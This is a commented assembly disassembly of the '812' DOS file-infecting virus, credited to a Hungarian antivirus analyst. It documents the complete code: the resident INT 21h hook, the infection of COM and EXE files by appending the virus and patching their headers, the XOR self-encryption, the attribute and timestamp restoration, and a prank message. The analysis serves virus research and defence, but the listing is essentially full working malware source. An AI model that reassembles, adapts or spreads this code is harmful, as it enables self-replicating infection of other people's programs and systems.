; 812 virus

; Discovered and commented by
;                   Ferenc Leitold
;            Hungarian VirusBuster Team
;                        Address: 1399 Budapest
;                                 P.O. BOX 701/349
;                                 HUNGARY


0100 E80300        CALL 0106                   ;
0103 4A            DEC  DX
0104 57            PUSH DI
0105 305A83        XOR  [BP+SI-7D],BL

0106 5A            POP  DX                     ; Start of the virus restored
0107 83EA03        SUB  DX,+03                 ; Start of the virus
010A B04A          MOV  AL,4A
010C B44B          MOV  AH,4B
010E CD21          INT  21                     ; Activated?
0110 3C57          CMP  AL,57
0112 751C          JNZ  0130                   ; No
0114 E97902        JMP  0390                   ; Yes

     ;
     ; ***** The original first 6 bytes restored *****
     ;

0117 C7060001E95D  MOV  WORD PTR [0100],5DE9
011D C70602011400  MOV  WORD PTR [0102],0014
0123 C70604017814  MOV  WORD PTR [0104],1478
0129 C3            RET

     ;
     ; ***** Buffer, that will be written out at the start of the file *****
     ;

012A E9E2BA        JMP  BC0F

012D 4A            DB   4Ah,57h,32h            ; Virus ID


0130 8CC8          MOV  AX,CS
0132 8ED8          MOV  DS,AX                  ; DS=CS
0134 050010        ADD  AX,1000
0137 8EC0          MOV  ES,AX                  ; ES=CS+64K
0139 BE0000        MOV  SI,0000
013C BF0000        MOV  DI,0000
013F B9FFFF        MOV  CX,FFFF
0142 F3            REPZ                        ; Move the program & virus
0143 A4            MOVSB
0144 1E            PUSH DS
0145 07            POP  ES                     ; ES=DS

     ;
     ; ***** Move the virus to CS:100h and start it *****
     ;

0146 89D6          MOV  SI,DX                  ; SI <- start of the virus
0148 BF0001        MOV  DI,0100                ; DI <- new address
014B B92C03        MOV  CX,032C                ; 812 byte length
014E B85401        MOV  AX,0154                ; Jump address
0151 E9D402        JMP  0428                   ; Go To The Move Routine

     ;
     ; ***** Start the Virus *****
     ;

0154 E81902        CALL 0370                   ; Decrypt the virus

     ;
     ; !!!!! This part was encrypted in the infected program !!!!!
     ;

0157 B82135        MOV  AX,3521
015A CD21          INT  21                     ; Get Int 21h vector
015C 891E5403      MOV  [0354],BX
0160 8C065603      MOV  [0356],ES              ; Save it
0164 BA0703        MOV  DX,0307
0167 B425          MOV  AH,25
0169 CD21          INT  21                     ; Set own Int 21h
016B C7060A007A01  MOV  WORD PTR [000A],017A   ; Set Terminate address
0171 8C0E0C00      MOV  [000C],CS              ;  Int 22h
0175 BA4004        MOV  DX,0440                ; Last addr+1 to keep resident
0178 CD27          INT  27                     ; TSR + Int 22h

     ;
     ; ***** Terminate the program (Int 22h) *****
     ;

017A 8CC8          MOV  AX,CS
017C 8ED0          MOV  SS,AX                  ; SS=CS
017E BCFEFF        MOV  SP,FFFE
0181 054500        ADD  AX,0045                ; 45=virus length+1
0184 8EC0          MOV  ES,AX                  ; ES=CS+45
0186 8CC8          MOV  AX,CS
0188 050010        ADD  AX,1000
018B 8ED8          MOV  DS,AX                  ; DS=CS+64K
018D BE0000        MOV  SI,0000
0190 BF0000        MOV  DI,0000
0193 B9FFFF        MOV  CX,FFFF
0196 F3            REPZ                        ; Move the prg with PSP
0197 A4            MOVSB                       ;  after the virus
0198 26            ES:
0199 8C063600      MOV  [0036],ES
019D 8CC3          MOV  BX,ES                  ; BX <- segment host program
019F B450          MOV  AH,50
01A1 CD21          INT  21                     ; Set current process ID
01A3 8BC3          MOV  AX,BX
01A5 4B            DEC  BX
01A6 8EC3          MOV  ES,BX                  ; ES <- MCB of the host prg
01A8 26            ES:
01A9 A30100        MOV  [0001],AX              ; Set Owner
01AC E9D201        JMP  0381                   ; Start Host program

     ;
     ; ***** Counting & Write out Message *****
     ;

01AF FF066E03      INC  WORD PTR [036E]        ; Increment counter
01B3 803E6E0300    CMP  BYTE PTR [036E],00     ; Zero
01B8 7401          JZ   01BB                   ; Yes
01BA C3            RET                         ; Return

01BB 803E6F0364    CMP  BYTE PTR [036F],64
01C0 7505          JNZ  01C7
01C2 C6066F0300    MOV  BYTE PTR [036F],00

01C7 B09C          MOV  AL,9C
01C9 02066F03      ADD  AL,[036F]
01CD A26E03        MOV  [036E],AL
01D0 BBE101        MOV  BX,01E1                ; Start of message
01D3 8A07          MOV  AL,[BX]                ; AL <- next char
01D5 3C00          CMP  AL,00                  ; End of message?
01D7 7407          JZ   01E0                   ; Yes
01D9 B40E          MOV  AH,0E
01DB CD10          INT  10                     ; Write char as TTY
01DD 43            INC  BX                     ; Next char
01DE EBF3          JMP  01D3                   ; Continue

01E0 C3            RET                         ; Return

     ;
     ; ***** Message *****
     ;

01E1     0D 0A 42 45 57 41 52-45 20 54 48 45 20 4A 41    ..BEWARE THE JA
01F0  42 42 45 52 57 4F 43 4B-21 0D 0A 07 00 48 49 20   BBERWOCK!....HI
0200  53 4F 4C 4C 59 2E 20 54-48 49 53 20 49 53 20 41   SOLLY. THIS IS A
0210  20 31 30 30 25 20 42 52-49 54 49 53 48 20 50 52    100% BRITISH PR
0220  4F 44 55 43 54 B0 00                              ODUCT..

     ;
     ; ***** Read & Change the File Attribute *****
     ;

0225 B000          MOV  AL,00                  ; Read the file attribute
0227 B443          MOV  AH,43
0229 CD21          INT  21
022B 2E            CS:
022C 890E6803      MOV  [0368],CX              ; Store it
0230 81E1FC00      AND  CX,00FC                ; Clear the R/O & Hidden
0234 B001          MOV  AL,01
0236 B443          MOV  AH,43
0238 CD21          INT  21                     ; Rewrite the attribute
023A C3            RET

     ;
     ;  ***** Infected EXE & COM programs *****
     ;

023B B43D          MOV  AH,3D
023D B002          MOV  AL,02
023F CD21          INT  21                     ; Open file for R/W
0241 7301          JNB  0244                   ; No error
0243 C3            RET
0244 8BD8          MOV  BX,AX                  ; Store handle
0246 0E            PUSH CS
0247 1F            POP  DS                     ; DS=CS
0248 B457          MOV  AH,57
024A B000          MOV  AL,00
024C CD21          INT  21                     ; Read date & time of file
024E 890E6A03      MOV  [036A],CX
0252 89166C03      MOV  [036C],DX              ; Store them
0256 BA5803        MOV  DX,0358                ; Address of buffer
0259 B43F          MOV  AH,3F
025B B90600        MOV  CX,0006
025E CD21          INT  21                     ; Read 6 bytes from file
0260 722A          JB   028C                   ; Error
0262 813E5B034A57  CMP  WORD PTR [035B],574A   ; Is it infected
0268 7422          JZ   028C                   ; Yes
026A 813E58034D5A  CMP  WORD PTR [0358],5A4D   ; EXE?
0270 751D          JNZ  028F                   ; No
0272 833E5C037F    CMP  WORD PTR [035C],+7F    ; Size of EXE < 64K
0277 7713          JA   028C                   ; No
0279 BA5E03        MOV  DX,035E                ; Next address in the buffer
027C B43F          MOV  AH,3F
027E B90A00        MOV  CX,000A
0281 CD21          INT  21                     ; Read 10 byte from file
0283 7207          JB   028C                   ; Error
0285 833E6403FF    CMP  WORD PTR [0364],-01    ; Max mem need for prg == ffffh
028A 7403          JZ   028F                   ; Yes
028C E96700        JMP  02F6                   ; Close file

     ;
     ; ***** Store the First 6 bytes from uninfected program
     ;

028F A15803        MOV  AX,[0358]
0292 A31B01        MOV  [011B],AX
0295 A15A03        MOV  AX,[035A]
0298 A32101        MOV  [0121],AX
029B A15C03        MOV  AX,[035C]
029E A32701        MOV  [0127],AX              ; Store the 1st 6 byte

02A1 B002          MOV  AL,02
02A3 B90000        MOV  CX,0000
02A6 BA0000        MOV  DX,0000
02A9 B442          MOV  AH,42
02AB CD21          INT  21                     ; Set file pointer to the end
02AD 83FA00        CMP  DX,+00                 ; Size of file > 64K
02B0 7544          JNZ  02F6                   ; Yes
02B2 3D0600        CMP  AX,0006                ; Size of file < 6 bytes
02B5 723F          JB   02F6                   ; Yes
02B7 3DE8FD        CMP  AX,FDE8                ; Size of file & virus < 64K
02BA 773A          JA   02F6                   ; No
02BC 2D0300        SUB  AX,0003                ; Calculate JUMP address
02BF A32B01        MOV  [012B],AX              ; Store it

    ; !!!!! End of encryped program !!!!!

02C2 E8AB00        CALL 0370                   ; Encrypt
02C5 BA0001        MOV  DX,0100                ; Start virus
02C8 B440          MOV  AH,40
02CA B92C03        MOV  CX,032C                ; Length virus
02CD CD21          INT  21                     ; Append virus to the program
02CF E89E00        CALL 0370                   ; Decrypt
02D2 B000          MOV  AL,00
02D4 B90000        MOV  CX,0000
02D7 BA0000        MOV  DX,0000
02DA B442          MOV  AH,42
02DC CD21          INT  21                     ; File pointer to start of file
02DE BA2A01        MOV  DX,012A
02E1 B440          MOV  AH,40
02E3 B90600        MOV  CX,0006
02E6 CD21          INT  21                     ; Write out the new start
02E8 8B0E6A03      MOV  CX,[036A]
02EC 8B166C03      MOV  DX,[036C]
02F0 B457          MOV  AH,57
02F2 B001          MOV  AL,01
02F4 CD21          INT  21                     ; Get back Date & Time
02F6 B43E          MOV  AH,3E                  ; Close file
02F8 CD21          INT  21
02FA C3            RET                         ; Return

     ;
     ; ***** Restore the original file attribute  *****
     ;

02FB 2E            CS:
02FC 8B0E6803      MOV  CX,[0368]
0300 B001          MOV  AL,01
0302 B443          MOV  AH,43
0304 CD21          INT  21
0306 C3            RET

     ;
     ; ***** Int 21h Routine *****
     ;

0307 80FC4B        CMP  AH,4B                  ; EXEC?
030A 7405          JZ   0311                   ; Yes
030C 2E            CS:
030D FF2E5403      JMP  FAR [0354]             ; Jump to the old Int 21h
0311 3C00          CMP  AL,00                  ; Load & Execute?
0313 7407          JZ   031C                   ; Yes
0315 3C4A          CMP  AL,4A                  ; Is it activated?
0317 75F3          JNZ  030C                   ; No
0319 B057          MOV  AL,57                  ; Set the answer.
031B CF            IRET                        ; Return

     ; Load & Execute
                                               ; Push registers
031C 50            PUSH AX
031D 53            PUSH BX
031E 51            PUSH CX
031F 52            PUSH DX
0320 57            PUSH DI
0321 56            PUSH SI
0322 1E            PUSH DS
0323 06            PUSH ES
0324 1E            PUSH DS
0325 52            PUSH DX                     ; (DS:DX) fspec into stack
0326 0E            PUSH CS
0327 1F            POP  DS                     ; DS=CS
0328 0E            PUSH CS
0329 07            POP  ES                     ; ES=CS
032A E84300        CALL 0370                   ; Encrypt the virus
032D E87FFE        CALL 01AF                   ; Counting & Send Message
0330 5A            POP  DX
0331 1F            POP  DS                     ; Restore fspec from stack
0332 1E            PUSH DS
0333 52            PUSH DX                     ; Push them again
0334 E8EEFE        CALL 0225                   ; Read & change file attr.
0337 E801FF        CALL 023B                   ; Infect file EXE & COM
033A 5A            POP  DX
033B 1F            POP  DS                     ; Restore fspec
033C E8BCFF        CALL 02FB                   ; Restore file attribute
033F 0E            PUSH CS
0340 1F            POP  DS                     ; DS=CS
0341 0E            PUSH CS
0342 07            POP  ES                     ; ES=CS
0343 E82A00        CALL 0370                   ; Decrypt the virus
0346 07            POP  ES
0347 1F            POP  DS
0348 5E            POP  SI
0349 5F            POP  DI
034A 5A            POP  DX
034B 59            POP  CX
034C 5B            POP  BX
034D 58            POP  AX                     ; Restore registers
034E EBBC          JMP  030C                   ; Continue Int 21h
0350 0000          ADD  [BX+SI],AL
0352 0000          ADD  [BX+SI],AL

     ;
     ; ***** Data Area of The Virus *****
     ;

0354 xxxx:xxxx                                 ; The original Int 21h

0358 E9      ADC    [E901],DL        ;!!!!!!!!!!!!
0359 5D            POP  BP
035A 1400          ADC  AL,00
035C 7814          JS   0372
035E 0E            PUSH CS
035F 0020          ADD  [BX+SI],AH
0361 00BD0CFF      ADD  [DI+FF0C],BH
0365 FF4B13        DEC  WORD PTR [BP+DI+13]
0368 xxxx          DW   xxxx                   ; File Attribute
036A xxxx          DW   xxxx                   ; File Time
036C xxxx          DW   xxxx                   ; File Date
036E xxxx          DW   xxxx                   ; Counter

     ;
     ; ***** Encrypt / Decrypt the main virus *****
     ;

0370 BF5701        MOV  DI,0157
0373 BE5701        MOV  SI,0157
0376 B9B500        MOV  CX,00B5
0379 AD            LODSW
037A 357501        XOR  AX,0175                ; Encrypt / decrypt
037D AB            STOSW
037E E2F9          LOOP 0379
0380 C3            RET

     ;
     ; ***** Start Host Program when the virus sit into the memory *****
     ;

0381 8BD8          MOV  BX,AX                  ; BX <- PSP of The Host prg
0383 0E            PUSH CS
0384 1F            POP  DS                     ; DS=CS
0385 0E            PUSH CS
0386 07            POP  ES                     ; ES=CS
0387 E8E6FF        CALL 0370                   ; Encrypt
038A 8EC3          MOV  ES,BX
038C 8EDB          MOV  DS,BX
038E 8ED3          MOV  SS,BX                  ; ES,DS,SS <- PSP
0390 E884FD        CALL 0117                   ; Restore the 1st 6 bytes
0393 813E00014D5A  CMP  WORD PTR [0100],5A4D   ; EXE?
0399 7407          JZ   03A2                   ; Yes
039B 1E            PUSH DS
039C B80001        MOV  AX,0100
039F 50            PUSH AX                     ; PSP:100 into the stack
03A0 EB76          JMP  0418                   ; Start the host program

03A2 8CD8          MOV  AX,DS
03A4 051000        ADD  AX,0010
03A7 8ED8          MOV  DS,AX                  ; DS,ES,BP <- Start address of prg
03A9 8EC0          MOV  ES,AX
03AB 89C5          MOV  BP,AX
03AD 8B0E0600      MOV  CX,[0006]              ; Items in relocation table
03B1 E319          JCXZ 03CC                   ; None relocation table (entry)

     ;
     ;  ***** Relocation of EXE files *****
     ;

03B3 8B361800      MOV  SI,[0018]              ; File-offset of 1st entry
03B7 AD            LODSW                       ; Load low word
03B8 8BF8          MOV  DI,AX                  ; Save it
03BA AD            LODSW                       ; Load high word
03BB 03C5          ADD  AX,BP                  ; + start address
03BD 03060800      ADD  AX,[0008]              ; + size of header in paragh.
03C1 8EC0          MOV  ES,AX                  ; Store it into ES
03C3 26            ES:
03C4 012D          ADD  [DI],BP                ; Relocate this word
03C6 E2EF          LOOP 03B7                   ; Next address
03C8 8CD8          MOV  AX,DS
03CA 8EC0          MOV  ES,AX                  ; ES=DS

03CC A10E00        MOV  AX,[000E]              ; segment of stack in file
03CF 03C5          ADD  AX,BP                  ; + start address
03D1 FA            CLI
03D2 8ED0          MOV  SS,AX
03D4 8B261000      MOV  SP,[0010]              ; Set stack address
03D8 FB            STI
03D9 8B1E1400      MOV  BX,[0014]              ; IP of EXE
03DD A11600        MOV  AX,[0016]              ; CS of EXE
03E0 03C5          ADD  AX,BP                  ; + start address
03E2 89C5          MOV  BP,AX                  ; BP <- CS
03E4 BF0000        MOV  DI,0000
03E7 89FE          MOV  SI,DI                  ; SI,DI <- 0
03E9 A10800        MOV  AX,[0008]              ; Length of header in paragh.
03EC B104          MOV  CL,04
03EE D3E0          SHL  AX,CL                  ; Exchange bytes
03F0 01C6          ADD  SI,AX                  ; SI <- start address in memory
03F2 8BD0          MOV  DX,AX                  ; DX <- size of header in byte
03F4 A10400        MOV  AX,[0004]              ; length of prg in pages
03F7 833E020000    CMP  WORD PTR [0002],+00    ; length modulo 512 == 0
03FC 7401          JZ   03FF                   ; Yes
03FE 48            DEC  AX                     ; Decrement page number
03FF B109          MOV  CL,09
0401 D3E0          SHL  AX,CL                  ; Exchange bytes
0403 03060200      ADD  AX,[0002]              ; Add the rest
0407 29D0          SUB  AX,DX                  ; File length - size of header
0409 89C1          MOV  CX,AX                  ; Length of program
040B F3            REPZ
040C A4            MOVSB                       ; Move it to PSP:100h
040D 8CD8          MOV  AX,DS
040F 2D1000        SUB  AX,0010
0412 8ED8          MOV  DS,AX                  ; DS,ES <- address of PSP
0414 8EC0          MOV  ES,AX
0416 55            PUSH BP
0417 53            PUSH BX                     ; Push CS & IP for RETF

     ;
     ; ***** Reset registers & Start the program
     ;

0418 B80000        MOV  AX,0000
041B 8BD8          MOV  BX,AX
041D 89C1          MOV  CX,AX
041F 8BD0          MOV  DX,AX
0421 8BF8          MOV  DI,AX
0423 8BF0          MOV  SI,AX
0425 89C5          MOV  BP,AX                  ; Clear general registers
0427 CB            RETF                        ; Start the host prg

     ;
     ; ***** Move the virus ****
     ;

0428 F3            REPZ
0429 A4            MOVSB
042A FFE0          JMP  AX

